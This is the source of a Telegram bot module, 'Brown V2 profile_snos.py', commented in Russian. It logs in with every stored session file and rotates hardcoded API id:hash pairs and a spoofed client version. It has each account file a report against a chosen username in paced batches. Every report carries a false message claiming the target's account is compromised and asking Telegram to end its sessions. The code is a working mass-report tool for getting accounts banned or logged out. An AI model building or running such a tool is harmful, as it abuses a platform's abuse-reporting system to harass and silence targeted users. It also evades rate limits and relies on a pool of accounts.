# coding: utf-8
"""
Brown V2 | profile_snos.py
[ТЕСТ] Жалоба на профиль через новый метод messages.ReportRequest id=[]
Маршрут: Другое → Прочее → текст (My account has been compromised...)
Все сессии из sessions/ + prem_sessions/
Только для администраторов.
"""

import os
import asyncio
import random
import logging
from telethon import TelegramClient
from telethon.tl.functions.messages import ReportRequest
from telethon.errors import FloodWaitError, UsernameNotOccupiedError, UsernameInvalidError
from telethon.tl.functions.contacts import ResolveUsernameRequest
from telethon.tl.types import InputPeerUser
from aiogram import types
import config
from config import bot_logs
import keyboards
from utils import now_msk, esc_md

logger = logging.getLogger(__name__)

bot = None
main_bot = None

SESSION_FOLDERS = ['sessions', 'prem_sessions']
LOG_FOLDER = 'logs'
os.makedirs(LOG_FOLDER, exist_ok=True)

REPORT_TEXT = "My account has been compromised. Please terminate all active sessions immediately to protect my data."

API = [
    '24565698:5a084b434f8505ace703485b9da85040',
    '27904162:e7cba879b1c643ba77490bf328df5eab',
    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
    '29512095:0b29a7d42fff002856b9bed64f7ec919',
    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
    '21156147:90408de329b27f7dd411dff3e601acc6',
    '29840977:e20b6a9fd01cc9055de0a88a183a030b',
    '29412963:3e37e1d05422db9426aa85e617b441ea',
    '23140129:431e5e839aecf4abdce22d7663acffa7',
]


def set_bot_profile(b):
    global bot, main_bot
    bot = b
    if main_bot is None:
        main_bot = b


def _get_sessions():
    result = []
    for folder in SESSION_FOLDERS:
        if not os.path.exists(folder):
            continue
        for f in os.listdir(folder):
            if f.endswith('.session'):
                result.append(os.path.join(folder, f.replace('.session', '')))
    return result


def format_log_line(session, target, status):
    now = now_msk().strftime('%H:%M:%S')
    return f'[{now}] {os.path.basename(session)}.session -> {target} - [{status}]'


def _archive_invalid_session(session_path: str):
    """Перемещает невалидную сессию в папку invalid_sessions/"""
    try:
        invalid_dir = 'invalid_sessions'
        os.makedirs(invalid_dir, exist_ok=True)
        basename = os.path.basename(session_path)
        for ext in ('.session', '.session-journal'):
            src = session_path + ext
            if os.path.exists(src):
                dst = os.path.join(invalid_dir, basename + ext)
                os.rename(src, dst)
        print(f'[PROFILE] Сессия {basename} перемещена в invalid_sessions/', flush=True)
    except Exception as e:
        print(f'[PROFILE] Ошибка архивации сессии: {e}', flush=True)


async def _find_option(client, peer, keyword_ru: str, keyword_en: str, prev_option: bytes = b'') -> bytes | None:
    """
    Делает шаг ReportRequest с prev_option и ищет в результате
    категорию содержащую keyword_ru или keyword_en (регистронезависимо).
    Возвращает bytes option или None.
    """
    try:
        r = await client(ReportRequest(peer=peer, id=[], option=prev_option, message=''))
        if not hasattr(r, 'options') or not r.options:
            return None
        for opt in r.options:
            text = opt.text.lower() if hasattr(opt, 'text') and opt.text else ''
            if keyword_ru.lower() in text or keyword_en.lower() in text:
                return opt.option
        # Не нашли по ключевым словам — берём последний вариант (обычно "Другое/Прочее")
        return r.options[-1].option
    except Exception as e:
        logger.warning(f'[PROFILE] _find_option error: {e}')
        return None


async def _scout_options(target_username: str) -> tuple[bytes | None, bytes | None]:
    """
    Разведчик: находит option для "Другое" и подкатегорию "Прочее".
    Возвращает (other_option, misc_option).
    """
    sessions = _get_sessions()
    if not sessions:
        return None, None

    scout_path = sessions[0]
    creds = random.choice(API)
    api_id, api_hash = creds.split(':', 1)

    client = TelegramClient(scout_path, int(api_id), api_hash,
                            system_version='4.16.30-vxCUSTOM')
    try:
        await asyncio.wait_for(client.connect(), timeout=10)
        if not await client.is_user_authorized():
            await client.disconnect()
            return None, None

        uname = target_username.lstrip('@')
        resolved = await client(ResolveUsernameRequest(uname))
        if not resolved.users:
            await client.disconnect()
            return None, None
        u = resolved.users[0]
        peer = InputPeerUser(u.id, u.access_hash)

        # Шаг 1: ищем "Другое" / "Other"
        other_opt = await _find_option(client, peer, 'другое', 'other', b'')
        print(f'[PROFILE] Разведчик: other_opt={other_opt}', flush=True)

        if other_opt is None:
            await client.disconnect()
            return None, None

        # Шаг 2: ищем "Прочее" / "Misc" / "Other" в подкатегориях
        misc_opt = await _find_option(client, peer, 'прочее', 'misc', other_opt)
        # Если нет подкатегорий — misc_opt будет None, будем отправлять текст сразу
        print(f'[PROFILE] Разведчик: misc_opt={misc_opt}', flush=True)

        await client.disconnect()
        return other_opt, misc_opt

    except Exception as e:
        print(f'[PROFILE] Разведчик ошибка: {e}', flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return None, None


async def _report_session(session_path: str, target_username: str,
                          other_opt: bytes, misc_opt: bytes | None) -> str:
    """
    Одна сессия: Другое → Прочее (если есть) → текст.
    """
    creds = random.choice(API)
    api_id, api_hash = creds.split(':', 1)
    session_name = os.path.basename(session_path)

    client = TelegramClient(session_path, int(api_id), api_hash,
                            system_version='4.16.30-vxCUSTOM')
    try:
        # Retry connect up to 2 times
        connected = False
        for _attempt in range(2):
            try:
                await asyncio.wait_for(client.connect(), timeout=12)
                connected = True
                break
            except (asyncio.TimeoutError, OSError, ConnectionError):
                if _attempt == 1:
                    return 'ОШИБКА СОЕДИНЕНИЯ'
                await asyncio.sleep(1)
        if not connected:
            return 'ОШИБКА СОЕДИНЕНИЯ'

        if not await client.is_user_authorized():
            await client.disconnect()
            _archive_invalid_session(session_path)
            return 'НЕВАЛИД'

        # Resolve entity via ResolveUsernameRequest to always get access_hash
        try:
            uname = target_username.lstrip('@')
            resolved = await client(ResolveUsernameRequest(uname))
            if not resolved.users:
                await client.disconnect()
                return 'НЕ НАЙДЕН'
            u = resolved.users[0]
            peer = InputPeerUser(u.id, u.access_hash)
        except (UsernameNotOccupiedError, UsernameInvalidError):
            await client.disconnect()
            return 'НЕ НАЙДЕН'
        except Exception as e:
            await client.disconnect()
            return f'ОШИБКА: {str(e)[:40]}'

        # Шаг 1: инициируем флоу
        try:
            await client(ReportRequest(peer=peer, id=[], option=b'', message=''))
        except Exception as e:
            await client.disconnect()
            return f'ОШИБКА ШАГ1: {str(e)[:40]}'

        # Шаг 2: выбираем "Другое"
        try:
            await client(ReportRequest(peer=peer, id=[], option=other_opt, message=''))
        except Exception as e:
            await client.disconnect()
            return f'ОШИБКА ШАГ2: {str(e)[:40]}'

        # Шаг 3: выбираем "Прочее" (если есть подкатегория)
        if misc_opt and misc_opt != other_opt:
            try:
                await client(ReportRequest(peer=peer, id=[], option=misc_opt, message=''))
            except Exception as e:
                await client.disconnect()
                return f'ОШИБКА ШАГ3: {str(e)[:40]}'

        # Финальный шаг: отправляем текст
        try:
            await client(ReportRequest(peer=peer, id=[], option=b'', message=REPORT_TEXT))
        except Exception as e:
            # Пробуем с пустым option как финал
            try:
                await client(ReportRequest(peer=peer, id=[], option=misc_opt or other_opt, message=REPORT_TEXT))
            except Exception as e2:
                await client.disconnect()
                return f'ОШИБКА ФИНАЛ: {str(e2)[:40]}'

        await client.disconnect()
        print(f'[PROFILE] [{session_name}] ✅ ДОСТАВЛЕНО', flush=True)
        return 'ДОСТАВЛЕНО'

    except FloodWaitError as e:
        print(f'[PROFILE] [{session_name}] 🌊 FLOOD {e.seconds}с', flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return f'FLOOD {e.seconds}s'
    except Exception as e:
        print(f'[PROFILE] [{session_name}] ❌ {str(e)[:80]}', flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return f'ОШИБКА: {str(e)[:50]}'
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass


async def main_profile_snos(target_link: str, user: int, username: str, notify_bot=None):
    """Главная функция — жалоба на профиль от всех сессий."""

    # Нормализуем target
    raw = target_link.strip()
    if raw.startswith('https://t.me/'):
        target = raw.replace('https://t.me/', '').split('/')[0].split('?')[0]
    elif raw.startswith('t.me/'):
        target = raw.replace('t.me/', '').split('/')[0].split('?')[0]
    elif raw.startswith('@'):
        target = raw[1:].split('/')[0]
    else:
        target = raw.split('/')[0].split('?')[0]

    _notify = notify_bot or bot
    sessions = _get_sessions()
    if not sessions:
        await _notify.send_message(
            user, '❌ *Нет сессий!*',
            parse_mode='Markdown', reply_markup=keyboards.main_menu
        )
        return

    total = len(sessions)

    await _notify.send_message(
        user,
        f'👤 *\[ТЕСТ\] Profile Report*\n'
        f'*└─ Цель:* *@{target}*\n'
        f'*└─ Сессий:* {total}\n'
        f'*└─ Маршрут:* Другое → Прочее → текст\n\n'
        f'⏳ *Определяю категории...*',
        parse_mode='Markdown'
    )

    # Разведка — находим нужные option
    other_opt, misc_opt = await _scout_options(target)

    if other_opt is None:
        await bot.send_message(
            user,
            '❌ *Не удалось определить категории!*\n'
            '*Проверь username и попробуй снова.*',
            parse_mode='Markdown', reply_markup=keyboards.main_menu
        )
        return

    print(f'[PROFILE] 🚀 Старт | *@{target}* | сессий={total} | other={other_opt} | misc={misc_opt}', flush=True)

    # Запускаем пачками по 3 (по одному репорту с трёх аккаунтов → пауза)
    BATCH_SIZE = 3
    results = []
    for i in range(0, total, BATCH_SIZE):
        batch = sessions[i:i + BATCH_SIZE]
        batch_results = await asyncio.gather(
            *[_report_session(s, target, other_opt, misc_opt) for s in batch],
            return_exceptions=True
        )
        for s, r in zip(batch, batch_results):
            results.append((s, r))
        if i + BATCH_SIZE < total:
            await asyncio.sleep(random.uniform(3, 6))

    # Подсчёт
    delivered = sum(1 for _, r in results if r == 'ДОСТАВЛЕНО')
    failed = total - delivered

    # Лог-файл
    now_str = now_msk().strftime('%d.%m.%Y %H:%M:%S')
    log_lines = [
        'Brown V2 log | profile-method [ТЕСТ]',
        '-' * 42,
        f'Пользователь: {user} (*@{username}*)',
        f'Цель: *@{target}*',
        f'Маршрут: Другое -> Прочее -> текст',
        f'Время: {now_str}',
        '-' * 42,
    ]
    for session, result in results:
        if isinstance(result, Exception):
            log_lines.append(format_log_line(session, target, f'ИСКЛЮЧЕНИЕ: {str(result)[:50]}'))
        else:
            log_lines.append(format_log_line(session, target, result))
    log_lines += ['-' * 42, f'Успешно: {delivered}', f'Неуспешно: {failed}']

    log_name = f'brown_v2_profile_log_{os.urandom(8).hex()}.txt'
    log_path = os.path.join(LOG_FOLDER, log_name)
    with open(log_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(log_lines))

    target_esc = target.replace('_', '\\_')
    caption_user = (
        f'👤 *\[ТЕСТ\] Profile Report завершён!*\n\n'
        f'🎯 *Цель:* *@{target_esc}*\n'
        f'📋 *Маршрут:* Другое → Прочее → текст\n'
        f'🕐 *Время:* {now_str}\n\n'
        f'🟢 *Успешно: {delivered}*\n'
        f'🔴 *Не удалось: {failed}*'
    )
    try:
        import db as _db_mod
        _is_hid = await _db_mod.get_is_hidden(user)
        _log_uid = "скрыт" if _is_hid else str(user)
        _log_uname = "скрыт" if _is_hid else username
    except Exception:
        _log_uid, _log_uname = str(user), username

    caption_log = (
        f'👤 *\[ТЕСТ\] Profile-method*\n\n'
        f'🎯 *Цель:* *@{target_esc}*\n'
        f'👤 *Пользователь:* {_log_uid} (*@{_log_uname}*)\n'
        f'🕐 *Время:* {now_str}\n\n'
        f'🟢 *Успешно: {delivered}*\n'
        f'🔴 *Не удалось: {failed}*'
    )

    try:
        await bot.send_document(
            user, types.InputFile(log_path),
            caption=caption_user,
            parse_mode='Markdown',
            reply_markup=keyboards.main_menu
        )
        await main_bot.send_document(
            bot_logs, types.InputFile(log_path),
            caption=caption_log,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f'[PROFILE] Ошибка отправки лога: {e}')

    try:
        os.remove(log_path)
    except Exception:
        pass
